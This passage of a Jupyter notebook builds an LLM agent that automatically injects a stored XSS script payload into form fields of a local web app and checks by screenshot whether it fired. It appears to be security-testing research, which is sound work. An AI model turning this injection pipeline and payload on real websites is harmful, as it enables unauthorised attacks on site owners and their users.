    "    page = state[\"page\"]\n",
    "    xss_triggered = False\n",
    "    screenshot_path  = \"./output/xss_proof.png\"\n",
    "    await page.screenshot(path= screenshot_path)\n",
    "\n",
    "    result = verify_xss(image_path = screenshot_path)\n",
    "\n",
    "    result = \"✅ XSS alert triggered!\" if (result['xss_triggered'] == True) else \"❌ No XSS alert detected.\"\n",
    "    print(result)\n",
    "\n",
    "    state[\"last_action\"] = result\n",
    "    state[\"xss_detection\"].append({'page':page.url , 'result':result})\n",
    "    return state\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dc271c6f-95ee-4425-909c-7e22d16ac8fd",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "\n",
    "\n",
    "tools = [\n",
    "    navigate_to_link,\n",
    "    click_button_by_html,\n",
    "    XSS_injection_tool,\n",
    "    check_XSS_alert\n",
    "]\n",
    "\n",
    "state['tools'] = tools"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "79f13a91-20c9-434c-a956-717a0918b3a8",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "prompt = f\"\"\"\n",
    "You are a workflow planner agent.\n",
    "\n",
    "## Objective:\n",
    "You are given:\n",
    "1. A workflow to complete.\n",
    "2. A list of natural language steps that must be followed in sequence.\n",
    "3. A list of available tools (functions) in JSON format — each tool has a name and a description.\n",
    "\n",
    "Your job:\n",
    "        - Match each step with the most appropriate tool.\n",
    "        - Describe the specific action and **arguments/parameters** the tool should use.\n",
    "        - fill with XSS payload to all non-email fields (i.e notes , name etc) -- XSS payload '<script>  document.body.innerHTML = '<h1 style=\"color:red\">XSS WORKED</h1>';</script>'\n",
    "        - Include details like which values are passed in (if relevant).\n",
    "        - if there is a form to fill do not have a step to click button to subimt form as filling it would submit it automaticaly\n",
    "        - DO NOT REPEAT SAME STEPS\n",
    "        - if there are multiple steps in a singe step separate them into multiple steps \n",
    "        - DO NOT DO THIS\" Verify XSS alert on contacts page -> check_XSS_alert -> Check if an alert was triggered on the page at URL 'http://127.0.0.1:5000/contacts' \"\n",
    "        - DO THIS\" Verify XSS alert on contacts page -> navigate_to_url 'http://127.0.0.1:5000/contacts' -> check_XSS_alert -> Check if an alert was triggered  \"\n",
    "\n",
    "        For example : verify using checkxss alert after navigating to one of the following URLs:\n",
    "        http://127.0.0.1:5000/dashboard, http://127.0.0.1:5000/contacts, \n",
    "        separate this to \n",
    "        step : navigate_to_link http://127.0.0.1:5000/dashboard .\n",
    "        step:  verify using check_xss_alert , \n",
    "        step : navigate_to_link ://127.0.0.1:5000/contacts . \n",
    "        step : verify using check_xss_alert\n",
    "        \n",
    "\n",
    "\n",
    "## Steps:\n",
    "{wf[\"workflow_steps\"]}\n",
    "\n",
    "## Input Values (e.g. for forms):\n",
    "{wf.get(\"values\", {})}\n",
    "\n",
    "## Available Tools (in JSON):\n",
    "{state[\"tools\"]}\n",
    "\n",
    "---\n",
    "\n",
    "## Output format:\n",
    "Produce a **single-line string**, no newlines. For each step, use this format:\n",
    "\n",
    "`StepDescription -> ToolName -> DetailedAction`\n",
    "\n",
    "Where:\n",
    "- `StepDescription` is a natural language summary of the step.\n",
    "- `ToolName` is the name of the tool to use.\n",
    "- `DetailedAction` explains exactly what the tool should do, including what arguments or values are used (if applicable).\n",
    "\n",
    "Separate each step with ` || ` (double pipe). Do not add newlines or extra commentary.\n",
    "\n",
    "---\n",
    "\n",
    "## Example Output:\n",
    "Navigate to the contact creation page -> navigate_to_link -> Go to relative URL '/contacts/add' from base URL || Fill out the form with name, email, and notes -> form_filling_tool -> Fill 'name' with 'John Doe', 'email' with 'john@example.com', and 'notes' with 'New lead from campaign' || Click the submit button -> click_button_by_html -> Find and click button with text 'Save Contact' and type='submit'\n",
    "\n",
    "Only return the result in the required format.\n",
    "\"\"\"\n",
    "\n",
    "\n",
    "prompt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2d379710-35a8-4bc5-be13-c2fab8b92b4b",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "import llm_bridge\n",
    "\n",
    "llm = llm_bridge.Bridge()\n",
    "\n",
    "\n",
    "\n",
    "response = llm.get_response(prompt)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a3e692f6-24f8-4e86-8980-c943df77e34b",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "toolflow = response.choices[0].message.content\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3d745431-ff18-410a-a3a9-4c8e07631617",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "toolflow = toolflow.replace(\"\\\"\", \"\")\n",
    "toolflow"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "30693c7c-bf03-447c-9963-46754494e8b6",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "tool_flow_list = toolflow.split(\"||\")\n",
    "tool_flow_list"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6a569a59-e762-4924-82dd-30409143eb5f",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "tool_registry = {\n",
    "    \"navigate_to_link\": navigate_to_link,\n",
    "    \"XSS_injection_tool\": XSS_injection_tool,\n",
    "    \"click_button_by_html\": click_button_by_html,\n",
    "    \"check_XSS_alert\": check_XSS_alert,\n",
    "}\n",
    "\n",
    "\n",
    "# tools = [\n",
    "#     navigate_to_link,\n",
    "#     click_button_by_html,\n",
    "#     XSS_injection_tool,\n",
    "#     check_XSS_alert\n",
    "# ]\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5f726f90-f355-4a28-b41a-bf39829bd986",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "import re\n",
    "\n",
    "\n",
    "print(tool_flow_list)\n",
    "parsed_plan = []\n",
    "for s in tool_flow_list:\n",
    "    parsed = {}\n",
    "\n",
    "    match = re.match(r\"^(.*?)\\s*->\", s)\n",
    "    if match:\n",
    "        step_description = match.group(1).strip()\n",
    "        # print(step_description)\n",
    "\n",
    "    match = re.match(r\"^[^>]*->\\s*([^>]+?)\\s*->\", s)\n",
    "    if match:\n",
    "        tool_name = match.group(1).strip()\n",
    "        # print(tool_name)\n",
    "\n",
    "    match = re.match(r\"^[^>]*->[^>]*->\\s*(.*)$\", s)\n",
    "    if match:\n",
    "        action = match.group(1).strip()\n",
    "        # print(action)\n",
    "        \n",
    "    parsed['step'] = step_description\n",
    "    parsed['tool'] = tool_name\n",
    "    parsed['action'] = action\n",
    "    print(parsed)\n",
    "    parsed_plan.append(parsed)\n",
    "    \n",
    "    \n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a04719ce-ca11-42ab-a4b5-f2394b2dcae1",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "parsed_plan"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5f27fc7d-9063-4636-8c26-01b60f45e9d4",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "def get_json_from_output(text):\n",
    "    match = re.search(r'```json\\s*(\\{.*?\\})\\s*```', text, re.DOTALL)\n",
    "\n",
    "    if match:\n",
    "        json_str = match.group(1)\n",
    "        json_data = json.loads(json_str)\n",
    "        print(json_data)\n",
    "    else:\n",
    "        print(\"No JSON found.\")\n",
    "    \n",
    "    return json_data\n",
    "content = await page.content()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6656f6a7",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "!uv pip install langchain_groq"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b5940e1c-bca5-45e6-a1bc-32eb1856f7dd",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "from langchain_core.prompts import PromptTemplate\n",
    "from langchain.chains import LLMChain\n",
    "import json\n",
    "\n",
    "# 1. Define your LLM\n",
    "from langchain_groq import ChatGroq\n",
    "from langchain.prompts import PromptTemplate\n",
    "from langchain.chains import LLMChain\n",
    "from dotenv import load_dotenv\n",
    "import os\n",
    "\n",
    "load_dotenv(dotenv_path=\"./.env\")\n",
    "\n",
    "\n",
    "GROQ_API_KEY = os.environ.get(\"GROQ_API_KEY\")\n",
    "\n",
    "# Groq model setup (e.g., Mixtral)\n",
    "llm = ChatGroq(\n",
    "    temperature=0,\n",
    "    model_name=\"llama-3.3-70b-versatile\",  # or gemma-7b-it, llama3-8b-8192\n",
    "    groq_api_key=GROQ_API_KEY # or set via env variable\n",
    ")\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "# 2. Define the agent's prompt\n",
    "prompt = PromptTemplate.from_template(\"\"\"\n",
    "You are an automation agent. Your job is to decide which tool to use and what values to fill in, based on the page's HTML and the current step.\n",
    "\n",
    "Available tools:\n",
    "- navigate_to_link\n",
    "- XSS_injection_tool\n",
    "- click_button_by_html\n",
    "- check_XSS_alert\n",
    "\n",
    "Each tool has its own input format and make sure to adhere to these formats:\n",
    "- navigate_to_link: {{ \"relative_url\": \"...\" }}\n",
    "- XSS_injection_tool: {{ \"form_html\": \"...\", \"values\": {{ \"name\": \"...\", \"email\": \"...\", \"notes\": \"...\" }} }}\n",
    "- click_button_by_html: {{ \"button_html\": \"...\" }}\n",
    "- check_XSS_alert: {{ }}  // Use this after submitting a form with an XSS payload\n",
    "\n",
    "\n",
    "Reply with a JSON object:\n",
    "{{ \"tool\": \"...\", \"tool_args\": {{ ... }} }}\n",
    "\n",
    "\n",
    "\n",
    "for example if the action requires xss tool\n",
    "{{ \"tool\": \"XSS_injection_tool\", \"tool_args\": {{ \"form_html\": \"...\", \"values\": {{ \"name\": \"John\", \"email\": \"john@example.com\", \"notes\": \"test\" }} }} }}\n",
    "\n",
    "only when filling form fill the empty values with some examples \n",
    "\n",
    "\n",
    "Step: {step_description}\n",
    "\n",
    "Action for the agent to do : {step_action}\n",
    "Current Page HTML:\n",
    "{page_html}\n",
    "\n",
    "\n",
    "- Choose the correct tool and provide only the **required minimal arguments**.\n",
    "- Wrap the final output in **markdown-style fenced code block** with `json`, like this:\n",
    "- fill the form values with dummy names\n",
    "\n",
    "```json\n",
    "```\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\"\"\")\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "# 3. Wrap in LLMChain\n",
    "agent = LLMChain(llm=llm, prompt=prompt)\n",
    "\n",
    "# 4. Your function with the agent integrated\n",
    "async def run_plan(parsed_plan, initial_page_html):\n",
    "    state = {\n",
    "        \"home_url\":\"http://127.0.0.1:5000/\",\n",
    "        \"page\":page,\n",
    "        \"page_html\": initial_page_html,\n",
    "        \"current_step\": 0,\n",
    "        \"history\": [],\n",
    "        \"xss_detection\":[]\n",
    "    }\n",
    "\n",
    "    for idx, step_info in enumerate(parsed_plan):\n",
    "        print(f\"\\n➡️ Step {idx+1}: {step_info['step']}\")\n",
    "\n",
    "        page_html = state[\"page_html\"]\n",
    "        step_description = step_info[\"step\"]\n",
    "        step_action =  step_info[\"action\"]\n",
    "        # 5. LLM agent input\n",
    "        agent_input = {\n",
    "            \"page_html\": page_html,\n",
    "            \"step_description\": step_description,\n",
    "            \"step_action\": step_action\n",
    "            \n",
    "        }\n",
    "\n",
    "        # 6. Use LLM agent to choose tool and args\n",
    "        # decision_raw = await agent.ainvoke(agent_input)\n",
    "        # print(decision_raw)\n",
    "        # decision = json.loads(decision_raw[\"text\"]) \n",
    "\n",
    "        try:\n",
    "            decision_raw = await agent.ainvoke(agent_input)\n",
    "            print(f\"AGENT OUTPUT : {decision_raw} \\n\\n\")\n",
    "             # assumes LLMChain returns text field\n",
    "            \n",
    "        except Exception as e:\n",
    "            print(f\"❌ Failed to get response from agent: {e}\")\n",
    "            break\n",
    "\n",
    "\n",
    "        try:\n",
    "            decision = get_json_from_output(decision_raw[\"text\"]) \n",
    "            print(f\" EXTRACTED JSON : {decision}\")\n",
    "        except Exception as e:\n",
    "            print(f\"❌ Failed to parse agent output: {e}\")\n",
    "        \n",
    "        \n",
    "\n",
    "        tool_name = decision.get(\"tool\")\n",
    "        tool_args = decision.get(\"tool_args\", {})\n",
    "        tool_args['state'] = state\n",
    "        tool_func = tool_registry.get(tool_name)\n",
    "\n",
    "\n",
    "        print(f\"TOOL DETAILS : TOOL_NAME -> {tool_name} | TOOL_ARGS  -> {tool_args} | REGISTRY FUNC -> {tool_func} \")\n",
    "\n",
    "        if tool_func is None:\n",
    "            print(f\"❌ Tool '{tool_name}' not found\")\n",
    "            break\n",
    "\n",
    "        result = await tool_func.ainvoke(tool_args)\n",
    "        new_page_html = result.get(\"new_page_html\", page_html)\n",
    "            \n",
    "        \n",
    "        \n",
    "        \n",
    "        try:\n",
    "            print(f\"🔧 Running tool: {tool_name}\")\n",
    "            \n",
    "            result = await tool_func.ainvoke(tool_args)\n",
    "            new_page_html = result.get(\"new_page_html\", page_html)\n",
    "\n",
    "        except Exception as e:\n",
    "            print(f\"❌ Error running tool: {e}\")\n",
    "            break\n",
    "\n",
    "        # 7. Update state\n",
    "        state[\"history\"].append({\n",
    "            \"step\": step_info[\"step\"],\n",
    "            \"tool\": tool_name,\n",
    "            \"args\": tool_args,\n",
    "            \"result\": result\n",
    "        })\n",
    "        state[\"page_html\"] = new_page_html\n",
    "        state[\"current_step\"] += 1\n",
    "\n",
    "    print(\"✅ All steps executed.\")\n",
    "    return state\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0ba556c5-d2ca-43e7-bc97-34f65e02f988",
   "metadata": {
    "scrolled": true,
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "state = await run_plan(parsed_plan, content)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e8c95d7c-673c-4f14-bb94-fb1f99084cb5",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "state[\"xss_detection\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "54b8cc13-9ca8-4d88-b3f8-2d606f0c3d5e",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ef41e8af-a5d5-48e4-8513-0d0905e55dbc",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "11e30350",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2efa7480",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9a67e5ef",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "518f0de8",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d2e99b8d",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "37d2e122",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7303438d-7872-4b94-b75a-3645889d7235",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "NN",
   "language": "python",
   "name": "nn"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
